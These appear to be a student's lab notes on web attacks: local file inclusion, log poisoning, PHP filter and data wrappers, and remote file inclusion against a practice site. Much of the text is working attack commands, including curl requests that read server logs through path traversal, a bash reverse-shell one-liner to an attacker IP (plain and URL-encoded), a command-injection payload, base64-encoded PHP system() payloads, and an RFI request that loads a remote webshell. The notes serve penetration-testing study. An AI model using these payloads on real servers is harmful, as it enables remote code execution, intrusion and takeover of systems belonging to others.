LFI aims to include executable code in the web app's running code. When we navigate to that file, we are able to specify variables to run that code! This is different compared to Directory Traversal which allows us to read CONTENTS of files on the web server.

We can even obtain RCE via [_Log Poisoning_](https://owasp.org/www-community/attacks/Log_Injection).
```
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
```
*This shows that User Agent Header is stored in the access log.*

*We can use Burp to include malicious PHP code that will execute in the access.log file!*
	This snippet accepts a command via the _cmd_ parameter and executes it via the PHP [_system_](https://www.php.net/manual/en/function.system.php) function on the target system. We'll use [_echo_](https://www.php.net/manual/en/function.echo.php) to display command output.

![[Pasted image 20250703161014.png]]
`&cmd=[command]` allows us to make the server execute some code such as a reverse shell. that would be `&cmd=bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"`. This is our bash **reverse shell one liner**.

```
For [[9.4 OS Command Injection]] Captstone, 

curl -X POST http://192.168.234.16/login -d "username=&password=&ffa=test%22%26%26bash+-c+'bash+-i+>%26+/dev/tcp/192.168.48.143/443+0>%261'%22"

Above command worked but not the bash encoded reverse shell. It uses single quotes for the inner bash command.

```

We can also encode this and it would look like `bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22`

`python3 -c 'import pty; pty.spawn("/bin/bash")'`
	To stabilise shell.

NOTE that we can also do this on Windows but file paths are application dependent. We could also use system that don't use PHP but one of the following:
- [_Perl_](https://www.perl.org/)
- [_Active Server Pages Extended_](https://en.wikipedia.org/wiki/ASP.NET)
- [_Active Server Pages_](https://en.wikipedia.org/wiki/Active_Server_Pages)
- [_Java Server Pages_](https://en.wikipedia.org/wiki/Jakarta_Server_Pages)

# PHP Wrappers

Syntax in PHP that allows it to include additional capabilities to inputs. There are 2 main wrappers that we are concerned with that is `php://filter/...` and `php://data/...`. These can be further customized with additional syntax. 

`curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php`
	This does not do any filtering and is equivalent to using no parameters in a function.

`curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php`
	This would ask php to read the content of admin.php and convert its contents to base64.

*While the **php://filter** wrapper can be used to include the contents of a file, we can use the **data://** wrapper to achieve code execution.*

`curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"` 
	This embeds our malicious php to the page and then runs it! (if php has this vulnerability).  [_Allow_url_include_](https://www.php.net/manual/en/filesystem.configuration.php) setting needs to be enabled.

`curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
	If there are firewalls in place, we can encode our data to be embedded and executed in base64.

# Remote File Inclusion

Less common than LFI but also need [_Allow_url_include_](https://www.php.net/manual/en/filesystem.configuration.php) setting to be enabled. We can find webshell inbuilt in Kali in `/usr/share/webshells`. `simple-backdoor.php` is the webshell for php. `cat`ing this would also show how it's used!

 While LFI vulnerabilities can be used to include local files, RFI vulnerabilities allow us to include files from a remote system over [_HTTP_](https://developer.mozilla.org/en-US/docs/Web/HTTP) or [_SMB_](https://en.wikipedia.org/wiki/Server_Message_Block). The included file is also executed in the context of the web application.

![[Pasted image 20250703164023.png]]

`python3 -m http.server` to host current directory (which has webshell)
	We can then do `curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"` 

3 main types. First is uploading uploading a malicious script so it is executed on the web app. Second is combining it with another vulnerability like directory traversal to execute the file. Third is dependent on user interaction like uploading a .docx file with malicious macros.
